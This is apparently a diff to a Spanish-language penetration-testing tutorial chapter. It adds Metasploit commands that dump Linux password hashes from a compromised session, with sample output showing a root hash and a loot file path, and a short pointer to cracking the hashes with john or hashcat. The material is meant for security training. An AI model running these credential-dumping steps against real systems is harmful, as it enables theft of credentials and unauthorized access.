@@ -21,8 +21,17 @@ Podemos determinarlo observando el número que aparece después del nombre de us
 En el caso de Linux podemos usar el mismo módulo, pero debido a la configuración de meterpreter es necesario hacerlo de forma externa. Una vez obtenida la sesión, podemos hacerlo de la siguiente forma:
 
 ```bash
-msf > 
+msf > use post/linux/gather/hashdump
+msf post(linux/gather/hashdump) > set session <id>
+msf post(linux/gather/hashdump) > run
+[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
+[+] Unshadowed Password File: /root/.msf4/loot/20260813160549_default_192.76.9.3_linux.hashes_695316.txt
+[*] Post module execution completed
 ```
+
+## Cracking de contraseñas
+
+Este paso se puede realizar de la misma forma que hemos visto en [Windows](09_winhash.md#Cracking-de-hashes-NTLM). Simplemente debemos tener en cuenta el método con el que se ha creado el hash de la contraseña antes de ejecutar las herramientas, tanto `john` como `hashcat`.
 
 [⟵ Anterior](09_winhash.md) | [Siguiente ⟶]()
 
